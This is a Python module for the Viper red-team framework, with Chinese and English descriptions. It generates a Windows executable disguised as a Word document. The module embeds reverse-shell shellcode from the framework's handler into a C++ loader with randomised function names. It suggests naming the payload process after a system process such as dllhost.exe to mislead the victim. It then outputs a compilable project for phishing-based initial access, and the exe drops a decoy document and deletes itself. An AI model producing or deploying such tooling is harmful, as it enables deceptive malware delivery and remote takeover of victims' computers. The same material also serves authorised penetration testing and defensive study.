# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "伪造成Word文档的exe文件"
    DESC_ZH = "带有Word图标的exe文件,exe运行后自动释放内置的word文档,自拷贝到%User%\Documents目录并启动,然后删除自身"

    NAME_EN = "Fake exe file of Word document"
    DESC_EN = "An exe file with a Word icon. After the exe runs, it will automatically release the built-in word document, copy it to the %User%\Documents directory and start it, and then delete itself"

    MODULETYPE = TAG2TYPE.Initial_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/smihrw"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1566/001/"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionHander(),
        OptionStr(name='LoaderName', tag_zh="进程名称", desc_zh="载荷的进程名称,建议仿冒系统进程名,增强迷惑性.", default="dllhost.exe"),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "模块只支持windows类型载荷"
        return True, None

    def run(self):
        loadername = self.param("LoaderName")
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        FUNCTION = self.random_str(8)
        FUNCTION1 = self.random_str(9)
        source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode, FUNCTION=FUNCTION,
                                                        LOADERFILE=loadername)

        filename = f"FakeWordDoc_{int(time.time())}.zip"
        self.write_zip_vs_project(filename, source_code)

        self.log_good("模块执行成功")
        self.log_good(f"请在<文件列表>中查看生成的源码: {filename}")
